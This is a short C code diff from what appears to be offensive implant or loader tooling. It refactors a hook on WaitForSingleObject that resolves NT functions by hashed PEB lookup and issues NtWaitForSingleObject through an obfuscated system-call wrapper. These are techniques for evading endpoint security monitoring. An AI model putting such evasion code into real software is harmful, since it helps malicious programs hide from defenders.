@@ -38,6 +38,7 @@ D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD
 	API		Api;
 	LARGE_INTEGER	Del;
 
+	PVOID		Arg[ 3 ];
 	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;
 
 	/* Zero out stack structures */
@@ -49,20 +50,15 @@ D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD
 	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
 
 	if ( Timeout != INFINITE ) {
-		Del.QuadPart = -10000LL * Timeout;
-
-		PVOID Arg[] = {
-			C_PTR( Handle ),
-			C_PTR( FALSE ),
-			C_PTR( &Del )
-		};
+		Del.QuadPart = Timeout * -10000LL;
+		Arg[0] = C_PTR( Handle );
+		Arg[1] = C_PTR( FALSE );
+		Arg[2] = C_PTR( &Del );
 		Nst = ObfSystemCall( Api.NtWaitForSingleObject, Arg, ARRAYSIZE( Arg ) );
 	} else {
-		PVOID Arg[] = {
-			C_PTR( Handle ),
-			C_PTR( FALSE ),
-			C_PTR( NULL )
-		};
+		Arg[0] = C_PTR( Handle );
+		Arg[1] = C_PTR( FALSE );
+		Arg[2] = C_PTR( NULL );
 		Nst = ObfSystemCall( Api.NtWaitForSingleObject, Arg, ARRAYSIZE( Arg ) );
 	};
 	if ( ! NT_SUCCESS( Nst ) ) {
